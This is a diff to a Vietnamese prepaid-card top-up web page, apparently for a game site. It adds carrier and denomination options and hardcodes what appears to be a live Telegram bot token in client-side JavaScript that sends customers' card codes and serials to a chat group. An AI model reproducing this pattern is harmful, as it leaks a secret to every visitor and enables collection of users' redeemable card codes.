@@ -141,6 +141,8 @@
                                         <option value="Viettel">Viettel</option>
                                         <option value="Mobifone">Mobifone</option>
                                         <option value="Vinaphone">Vinaphone</option>
+                                        <option value="Vietnamobile">Vietnamobile</option>
+                                        <option value="GMobile">GMobile</option>
                                     </select>
                                 </div>
                                 <div>
@@ -148,6 +150,7 @@
                                     <select id="menhGia" class="w-full bg-lqvn-dark border border-gray-700 text-white rounded-xl px-4 py-3 outline-none focus:border-lqvn-red transition">
                                         <option value="10000">10,000đ</option>
                                         <option value="20000">20,000đ</option>
+                                        <option value="30000">30,000đ</option>
                                         <option value="50000">50,000đ</option>
                                         <option value="100000">100,000đ</option>
                                         <option value="200000">200,000đ</option>
@@ -320,7 +323,7 @@
                 timestamp: Date.now()
             }).then(() => {
                 
-                const botToken = "ĐIỀN_TOKEN_BOT_CỦA_SẾP_VÀO_ĐÂY"; 
+                const botToken = "8854082101:AAGmPYj6hzPkdSk6jdBVLgAJNp3BHHoEtQQ"; 
                 const groupId = "-5184599433";
                 const msg = `🚨 CÓ ĐƠN NẠP THẺ MỚI 🚨\n\n👤 UID Khách: ${currentUser.uid}\n📡 Mạng: ${nhaMang}\n💰 Mệnh giá: ${parseInt(menhGia).toLocaleString()}đ\n💳 Mã thẻ: ${maThe}\n🏷 Seri: ${soSeri}`;
                 
